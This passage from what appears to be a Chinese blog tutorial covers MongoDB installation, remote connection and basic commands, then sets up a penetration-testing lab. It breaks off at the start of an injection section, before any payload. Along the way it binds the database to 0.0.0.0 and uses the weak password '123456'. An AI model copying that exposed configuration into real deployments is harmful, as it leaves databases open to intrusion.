+<p>如果出现以下错误，解决方法是重新编写配置文件并在其中使用空格代替<code>tab</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%885.59.47.png" alt="截屏2021-11-07 下午5.59.47"></p>
+<p>完成后 Windows 便有了 MongoDB 服务，我们可以在服务中来管理 MongoDB，包括开机启动、设置启动方式等。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.05.17.png" alt="截屏2021-11-07 下午6.05.17"><br>我们以管理员身份打开终端启动 MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net start mongodb //启动MongoDB</span><br><span class="line">net stop mongodb //停止MongoDB</span><br></pre></td></tr></table></figure>
+<p>如果需要移除 MongDB 服务可以使用以下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\mongodb\bin\mongod.exe --remove</span><br></pre></td></tr></table></figure>
+
+<p>运行命令可直接进入 MongoDB 数据库当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br></pre></td></tr></table></figure>
+<p>默认连接到<code>test</code>数据库，饿哦吗能够在其中完成一些简单的算术运算</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">&gt; db</span><br><span class="line">&gt; 1+1</span><br></pre></td></tr></table></figure>
+<p>尝试插入数据并查看已插入的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.data.insert(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;mac&quot;</span>&#125;)</span><br><span class="line">&gt; db.data.find()</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.08.27.png" alt="截屏2021-11-07 下午6.08.27"></p>
+<h4 id="Linux下安装"><a href="#Linux下安装" class="headerlink" title="Linux下安装"></a>Linux下安装</h4><p>在 Linux 中安装 MongoDB 与 Windows 类似，首先导入 MongDB 的公共GPG密钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -</span><br></pre></td></tr></table></figure>
+<p>如果出现 gnupg 未安装的错误，可安装 gnupg 解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnupg</span><br></pre></td></tr></table></figure>
+
+<p>完成后再次导入密钥并为 MongoDB 创建文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main&quot;</span> | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.03.30.png" alt="截屏2021-11-07 下午3.03.30"></p>
+<p>通过 apt 命令更新本地软件数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>准备工作完成后我们开始安装MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y mongodb-org //安装最新稳定版</span><br><span class="line">apt-get install -y mongodb-org=4.4 mongodb-org-server=4.4 mongodb-org-shell=4.4 mongodb-org-mongos=4.4 mongodb-org-tools=4.4 //安装指定版</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.02.46.png" alt="截屏2021-11-07 下午3.02.46"></p>
+<p>需要注意的是如果仅指定<code>mongodb-org=4.4</code>，那么无论指定哪个版本都会安装每个 MongoDB 包中的最新版本。可使用以下命令查看可选版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org hold&quot;</span> | sudo dpkg --set-selections </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-server hold&quot;</span> | sudo dpkg --set-selections </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-shell hold&quot;</span> | sudo dpkg --set-selections </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-mongos hold&quot;</span> | sudo dpkg --set-selections</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;mongodb-org-tools hold&quot;</span> | sudo dpkg --set-selections</span><br></pre></td></tr></table></figure>
+
+<p>大多数类 Unix 系统都提供了基于每个进程和每个用户来限制和控制系统资源(例如线程，文件和网络连接)使用的方法。虽然这些限制可防止单个用户使用过多的系统资源，但有时这些限制的默认值较低，可能会在MongoDB正常运行时产生许多问题，因此我们可根据需要进行调整。</p>
+<p>启动MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start mongod</span><br></pre></td></tr></table></figure>
+<p>如果在启动时出现以下错误</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Failed</span> <span class="string">to</span> <span class="string">start</span> <span class="string">Mongod.service:Unit</span> <span class="string">mongod.service</span> <span class="string">not</span> <span class="string">found</span></span><br></pre></td></tr></table></figure>
+<p>可以使用以下命令解决并在完成后重新启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>
+<p>查看 MongoDB 是否已启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl status </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.05.33.png" alt="截屏2021-11-07 下午3.05.33"></p>
+<p>为 MongoDB 配置开机启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> mongod</span><br></pre></td></tr></table></figure>
+<p>使用以下命令可停止或重启MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop mongod</span><br><span class="line">sudo systemctl restart mongod</span><br></pre></td></tr></table></figure>
+
+<p>当然在<code>/var/log/mongodb/mongod.log</code>中存放着MongoDB的日志，如果需要删除可使用以下命令删除整个数据库日志目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -r /var/<span class="built_in">log</span>/mongodb</span><br></pre></td></tr></table></figure>
+<h3 id="MongoDB连接"><a href="#MongoDB连接" class="headerlink" title="MongoDB连接"></a>MongoDB连接</h3><h4 id="Windows下连接"><a href="#Windows下连接" class="headerlink" title="Windows下连接"></a>Windows下连接</h4><p><strong>下载地址：<a target="_blank" rel="noopener" href="https://www.mongodb.com/download-center/compass">https://www.mongodb.com/download-center/compass</a></strong><br>我们可安装数据库图形化管理工具compass来方便地管理 MongoDB，点击新建连接即可连接数据库<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.37.48.png" alt="截屏2021-11-07 下午6.37.48"><br>如果 MongoDB 服务未开启，可使用以下方法开启 MongoDB 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod -dbpath c:\mongdb\data\db</span><br></pre></td></tr></table></figure>
+<p>查看数据库所拥有的角色</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; use admin</span><br><span class="line">&gt; show roles </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.46.57.png" alt="截屏2021-11-07 下午6.46.57"></p>
+<p>新建连接用户并授权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.createUser(&#123;user:<span class="string">&quot;mac&quot;</span>,<span class="built_in">pwd</span>:<span class="string">&quot;123456&quot;</span>,roles:[&#123;<span class="string">&quot;role&quot;</span>:<span class="string">&quot;dbAdmin&quot;</span>,<span class="string">&quot;db&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;,&#123; <span class="string">&quot;role&quot;</span>:<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;db&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;]&#125;)</span><br><span class="line">&gt; db.auth(<span class="string">&quot;mac&quot;</span>,<span class="string">&quot;123456&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%889.59.09.png" alt="截屏2021-11-07 下午9.59.09"></p>
+<p>成功在本地登录 MongoDB</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo -u mac -p 123456 localhost:27017/admin</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.57.03.png" alt="截屏2021-11-07 下午6.57.03"><br>除了使用本地登录外，更多情况下我会选择使用 navicat 来远程登录，前提是我们需要在配置文件<code>mongod.cfg</code>中将<code>bindIp</code>设置为0.0.0.0，设置完成后需重启服务<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.59.16.png" alt="截屏2021-11-07 下午6.59.16"></p>
+<p>Navicat 远程连接成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%886.59.32.png" alt="截屏2021-11-07 下午6.59.32"></p>
+<p>账号管理扩展命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.updateUser(<span class="string">&quot;root&quot;</span>,&#123;roles:[&#123;role:<span class="string">&quot;readWriteAnyDatabase&quot;</span>,db:<span class="string">&quot;admin&quot;</span>&#125;]&#125;) //修改用户权限</span><br><span class="line">&gt; db.changeUserPassword(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;新密码&quot;</span>) //修改用户密码</span><br><span class="line">&gt; db.dropUser(<span class="string">&#x27;test&#x27;</span>) //删除用户</span><br></pre></td></tr></table></figure>
+<p><strong>参考文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f5afc6488f9e">https://www.jianshu.com/p/f5afc6488f9e</a></strong><br><strong>MongDB命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-databases-documents-collections.html">https://www.runoob.com/mongodb/mongodb-databases-documents-collections.html</a></strong></p>
+<h4 id="Linux下连接"><a href="#Linux下连接" class="headerlink" title="Linux下连接"></a>Linux下连接</h4><p>MongoDB配置文件默认设置 bindIp 为127.0.0.1，因此默认情况下 MongoDB 只能接受本地连接。如果需要远程连接，我们可以在 MongoDB 配置文件<code>/etc/mongdb.conf</code>下设置bindIp 为0.0.0.0，需要注意的是 MongoDB 2.x 与 3.x 配置文件格式有点不同，以下为3.x版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/mongod.conf</span><br><span class="line">sudo systemctl restart mongod</span><br><span class="line"><span class="comment"># 连接配置</span></span><br><span class="line">bindIP:0.0.0.0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.34.18.png" alt="截屏2021-11-07 下午3.34.18"></p>
+<p>使用 Navicat 远程连接成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%884.26.06.png" alt="截屏2021-11-07 下午4.26.06"></p>
+<h2 id="0x03-MongoDB基础用法"><a href="#0x03-MongoDB基础用法" class="headerlink" title="0x03 MongoDB基础用法"></a>0x03 MongoDB基础用法</h2><p>MongoDB 可以拥有多个数据库，每个数据库包含一个或多个集合（collections），每个集合包含一个或多个文档（documents），通过命令<code>mongo</code>可进入数据库当中</p>
+<h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><p><strong>创建数据库</strong><br>如果数据库存在则直接进入数据库，否则会创建新的数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use macdb</span><br></pre></td></tr></table></figure>
+<p>查看当前数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; db</span><br></pre></td></tr></table></figure>
+<p>检查数据库列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; show dbs</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.35.40.png" alt="截屏2021-11-07 下午3.35.40"></p>
+<p><strong>数据插入</strong><br>插入一些数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.data.insert(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;mac&quot;</span>&#125;)</span><br><span class="line">&gt; db.data.insert(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;mac&quot;</span>,<span class="string">&quot;age&quot;</span>:13&#125;)</span><br><span class="line">&gt; db.data.insert(&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;tom&quot;</span>,<span class="string">&quot;age&quot;</span>:20&#125;)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.39.04.png" alt="截屏2021-11-07 下午3.39.04"></p>
+<p><strong>数据查询</strong><br>查询全部数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.data.find()</span><br></pre></td></tr></table></figure>
+<p>查询特定数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.data.find(&#123;<span class="string">&quot;age&quot;</span>:13&#125;)</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.42.06.png" alt="截屏2021-11-07 下午3.42.06"></p>
+<p><strong>数据删除</strong><br>使用 remove 方法可按特定条件从集合中删除文档</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.data.remove(&#123;<span class="string">&quot;age&quot;</span>:13&#125;)</span><br><span class="line">&gt; db.data.find()</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.52.55.png" alt="截屏2021-11-07 下午3.52.55"></p>
+<p>如果需要删除集合可以通过以下方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show collections</span><br><span class="line">db.data.drop()</span><br><span class="line">show collections</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.51.54.png" alt="截屏2021-11-07 下午3.51.54"><br>删除数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/%E6%88%AA%E5%B1%8F2021-11-07%20%E4%B8%8B%E5%8D%883.56.33.png" alt="截屏2021-11-07 下午3.56.33"></p>
+<h3 id="扩展：自搭渗透环境"><a href="#扩展：自搭渗透环境" class="headerlink" title="扩展：自搭渗透环境"></a>扩展：自搭渗透环境</h3><p>熟悉了 MongoDB 的基础操作后，我们可搭建一个实验环境来测试 MongoDB 数据库，使用 kali 来模拟生产机器并安装 MongDB 、php以及web应用程序，假设web环境已经搭建好，那么尝试配置数据库</p>
+<h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; use mac</span><br><span class="line">&gt; db</span><br></pre></td></tr></table></figure>
+<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><p>将测试数据插入集合<code>users</code>和<code>products</code>当中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; db.users.insert(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;tom&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;tom&quot;</span>&#125;)</span><br><span class="line">&gt; db.users.insert(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;jim&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;jim&quot;</span>&#125;)</span><br><span class="line">&gt; db.users.insert(&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bob&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;bob&quot;</span>&#125;)</span><br><span class="line">&gt; db.products.insert(&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;tom@gmail.com&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="string">&quot;1500USD&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&gt; db.products.insert(&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;jim@gmail.com&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="string">&quot;50USD&quot;</span>&#125;)</span><br><span class="line">&gt; db.products.insert(&#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;bob@gmail.com&quot;</span>,<span class="string">&quot;price&quot;</span>:<span class="string">&quot;4500USD&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
+<h4 id="安装MongoDB驱动"><a href="#安装MongoDB驱动" class="headerlink" title="安装MongoDB驱动"></a>安装MongoDB驱动</h4><p>PHP web应用程序使用 MongoDB 的前提需安装对应的驱动，否则无法调用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php-pear</span><br><span class="line">sudo pecl install mongo</span><br><span class="line">sudo apt-get install php-mongodb</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-MongoDB渗透"><a href="#0x04-MongoDB渗透" class="headerlink" title="0x04 MongoDB渗透"></a>0x04 MongoDB渗透</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>这里以墨者靶场为例，源码如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/f10b0bf1/1.jpg" alt="1"></p>
+<p>靶场漏洞地址如下：</p>
